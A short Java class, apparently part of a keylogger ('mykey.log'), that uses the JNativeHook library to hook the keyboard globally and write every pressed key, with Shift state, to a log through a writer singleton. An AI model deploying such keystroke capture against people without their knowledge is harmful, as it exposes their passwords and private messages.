package com.mykey.log.mykey;


import java.io.IOException;


import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyListener implements NativeKeyListener {
	Writter writter;
	boolean shiftPressed = false;
	public KeyListener() {
		
		writter = Writter.getInstance();
		GlobalScreen.addNativeKeyListener(this);
	}

	public void nativeKeyPressed(NativeKeyEvent event) {
			if (NativeKeyEvent.VC_SHIFT_L == event.getKeyCode())
			{
				shiftPressed = true;
				return;
			}
				
			try {
				if (shiftPressed)
					writter.write(NativeKeyEvent.getKeyText(event.getKeyCode()) + " (Shift)");
				else
					writter.write(NativeKeyEvent.getKeyText(event.getKeyCode()).toLowerCase());
				
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
	}

	public void nativeKeyReleased(NativeKeyEvent event) {
		// TODO Auto-generated method stub
		if (NativeKeyEvent.VC_SHIFT_L == event.getKeyCode())
			shiftPressed = false;
	}

	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}

}
